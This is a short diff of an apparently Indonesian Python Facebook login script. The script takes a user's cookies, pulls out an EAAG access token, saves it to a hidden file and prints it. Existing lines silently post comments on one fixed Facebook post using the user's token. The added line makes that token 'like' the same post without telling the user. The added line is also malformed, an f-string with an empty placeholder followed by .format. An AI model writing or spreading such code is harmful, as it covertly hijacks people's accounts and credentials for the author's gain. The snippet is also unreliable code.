@@ -495,6 +495,7 @@ def login_lagi334():
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok1}", headers = {"cookie":your_cookies})
+									
 							except Exception as e:
 								print(e)
 							try:
@@ -505,6 +506,7 @@ def login_lagi334():
 									tok2 = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
 									open(".token2.txt","w").write(tok2)
 									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok2}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAG [bold green]<"))
+									requests.post(f"https://graph.facebook.com/878169396977639/likes?summary=true&access_token={}".format(tok2))
 									Console().print(f" {H2}• {P2}[bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]")
 									back()
 							except Exception as e:
